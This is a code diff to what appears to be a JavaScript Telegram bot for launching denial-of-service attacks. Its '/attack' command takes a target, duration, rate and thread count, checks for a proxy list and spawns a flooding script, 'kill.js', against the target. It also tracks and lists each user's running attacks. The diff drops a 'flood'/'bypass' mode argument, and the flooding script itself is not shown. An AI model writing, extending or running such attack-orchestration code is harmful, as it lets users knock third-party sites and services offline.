@@ -115,12 +115,12 @@ bot.on('message', async (msg) => {
 
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
-    if (args.length < 4 || args.length > 5) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/attack [target] [time] [rate] [thread] [input]' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    if (args.length !== 4) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/attack [target] [time] [rate] [thread]' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
-    const [target, timeStr, rate, thread, input = 'flood'] = args
+    const [target, timeStr, rate, thread] = args
     const time = parseInt(timeStr)
     const proxy = './prx.txt'
 
@@ -134,11 +134,6 @@ bot.on('message', async (msg) => {
       return
     }
 
-    if (input !== 'flood' && input !== 'bypass') {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Input must be "flood" or "bypass"' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
-      return
-    }
-
     try {
       await fs.access(proxy)
     } catch (err) {
@@ -146,9 +141,9 @@ bot.on('message', async (msg) => {
       return
     }
 
-    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, proxy, input], { stdio: ['ignore', 'pipe', 'pipe'] })
+    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, proxy], { stdio: ['ignore', 'pipe', 'pipe'] })
     const attackId = `${userId}_${Date.now()}`
-    activeAttacks[attackId] = { cmd, target, time, rate, thread, proxy, input, userId, remainingTime: time, messageId: null, startTime: Date.now() }
+    activeAttacks[attackId] = { cmd, target, time, rate, thread, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now() }
 
     const response = {
       status: 'Attack Started',
@@ -157,7 +152,6 @@ bot.on('message', async (msg) => {
       rate,
       thread,
       proxy,
-      input,
       caller: username,
       index: attackId
     }
@@ -196,7 +190,6 @@ bot.on('message', async (msg) => {
         rate,
         thread,
         proxy,
-        input,
         caller: username,
         index: attackId
       }
@@ -255,8 +248,7 @@ bot.on('message', async (msg) => {
         time: v.remainingTime,
         rate: v.rate,
         thread: v.thread,
-        proxy: v.proxy,
-        input: v.input
+        proxy: v.proxy
       }))
     bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
